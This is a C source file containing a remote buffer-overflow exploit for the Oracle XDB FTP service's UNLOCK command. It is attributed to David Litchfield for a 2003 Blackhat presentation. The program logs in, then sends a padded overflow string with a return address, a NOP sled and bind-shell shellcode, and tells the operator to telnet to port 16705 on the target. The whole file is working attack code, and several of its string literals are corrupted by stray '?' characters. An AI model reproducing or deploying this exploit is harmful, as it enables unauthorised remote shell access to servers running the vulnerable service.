#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


int main(int argc, char *argv[])
{

     struct hostent *he;
     struct sockaddr_in sa;
     int sock;
     unsigned int addr = 0;
     char recvbuffer[512]="";
     char user[260]="user ";
     char passwd[260]="pass ";
     int rcv=0;
     int snd =0;
     int count = 0;

     unsigned char nop_sled[1804]="";

     unsigned char saved_return_address[]="\x41\xc8\xff\xbf";

     unsigned char exploit[2100]="unlock / AAAABBBBCCCCDDDDEE?
       ?EEFFFFGGGGHHHHIIIIJJJJKKKK?
       ?LLLLMMMMNNNNOOOOPPPPQQQ?
       ?QRRRRSSSSTTTTUUUUVVVVWWW?
                           ?WXXXXYYYYZZZZaaaabbbbccccdd";

     unsigned char code[]="\x31\xdb\x53\x43\x53\x43\x53\x4b\x6a\x66\x58\x54\x59\xcd"
                    "\x80\x50\x4b\x53\x53\x53\x66\x68\x41\x41\x43\x43\x66\x53"
                    "\x54\x59\x6a\x10\x51\x50\x54\x59\x6a\x66\x58\xcd\x80\x58"
                    "\x6a\x05\x50\x54\x59\x6a\x66\x58\x43\x43\xcd\x80\x58\x83"
                    "\xec\x10\x54\x5a\x54\x52\x50\x54\x59\x6a\x66\x58\x43\xcd"
                    "\x80\x50\x31\xc9\x5b\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58"
     "\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x99\x52\x68"
     "\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54"
                    "\x59\xcd\x80\r\n";


     if(argc !=4)
     {
          printf("\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow Exploit");
          printf("\n\t\tfor Blackhat (http://www.blackhat.com)");
          printf("\n\n\tSpawns a shell listening on TCP Port 16705");
          printf("\n\n\tUsage:\t%s host userid password",argv[0]);
          printf("\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)?);
printf(?\n\t7th July 2003\n\n\n");
          return 0;
     }

     while(count < 1800)
     {
          nop_sled[count++]=0x90;
     }

     // Build the exploit
     strcat(exploit,saved_return_address);
     strcat(exploit,nop_sled);
     strcat(exploit,code);

     // Process arguments
     strncat(user,argv[2],240);
     strncat(passwd,argv[3],240);
     strcat(user,"\r\n");
     strcat(passwd,"\r\n");
     

     // Setup socket stuff
     sa.sin_addr.s_addr=INADDR_ANY;
     sa.sin_family = AF_INET;
     sa.sin_port = htons((unsigned short) 2100);

     // Resolve the target system
     if(isalpha(argv[1][0])==0)
     {
          addr = inet_addr(argv[1]);
          memcpy(&sa.sin_addr,&addr,4);
     }
     else
     {
          he = gethostbyname(argv[1]);
          if(he == NULL)
               return printf("Couldn't resolve host %s\n",argv[1]);
          memcpy(&sa.sin_addr,he->h_addr,he->h_length);
     }

     sock = socket(AF_INET,SOCK_STREAM,0);
     if(sock < 0)
          return printf("socket() failed.\n");

     if(connect(sock,(struct sockaddr *) &sa,sizeof(sa)) < 0)
     {
          close(sock);
          return printf("connect() failed.\n");
     }

     printf("\nConnected to %s....\n",argv[1]);

     // Receive and print banner
     rcv = recv(sock,recvbuffer,508,0);
     if(rcv > 0)
     {
          printf("%s\n",recvbuffer);
          bzero(recvbuffer,rcv+1);
     }
     else
     {
          close(sock);
          return printf("Problem with recv()\n");
     }

     // send user command
     snd = send(sock,user,strlen(user),0);
     if(snd != strlen(user))
     {     close(sock);
          return printf("Problem with send()....\n");
     }
     else
     {
          printf("%s",user);
     }
     
     // Receive response. Response code should be 331
     rcv = recv(sock,recvbuffer,508,0);
     if(rcv > 0)
     {

          if(recvbuffer[0]==0x33  && recvbuffer[1]==0x33 && recvbuffer[2]==0x31)
          {
               printf("%s\n",recvbuffer);
               bzero(recvbuffer,rcv+1);
          }
          else
          {
               close(sock);
               return printf("FTP response code was not 331.\n");
          }

     }
     else
     {
          close(sock);
          return printf("Problem with recv()\n");
     }


     // Send pass command
     snd = send(sock,passwd,strlen(passwd),0);
     if(snd != strlen(user))
     {
          close(sock);
          return printf("Problem with send()....\n");
     }
     else
          printf("%s",passwd);

     // Receive response. If not 230 login has failed.
     rcv = recv(sock,recvbuffer,508,0);
     if(rcv > 0)
     {
          if(recvbuffer[0]==0x32  && recvbuffer[1]==0x33 && recvbuffer[2]==0x30)
          {
               printf("%s\n",recvbuffer);
               bzero(recvbuffer,rcv+1);
          }
          else
          {
               close(sock);
               return printf("FTP response code was not 230. Login failed...\n");
          }
     }
     else
     {
          close(sock);
          return printf("Problem with recv()\n");
     }

     // Send the UNLOCK command with exploit
     snd = send(sock,exploit,strlen(exploit),0);
     if(snd != strlen(exploit))
     {
          close(sock);
          return printf("Problem with send()....\n");
     }


     // Should receive a 550 error response.
     rcv = recv(sock,recvbuffer,508,0);
     if(rcv > 0)
          printf("%s\n",recvbuffer);

     printf("\n\nExploit code sent....\n\nNow telnet to %s 16705\n\n",argv[1]);
     close(sock);
     return 0;

}
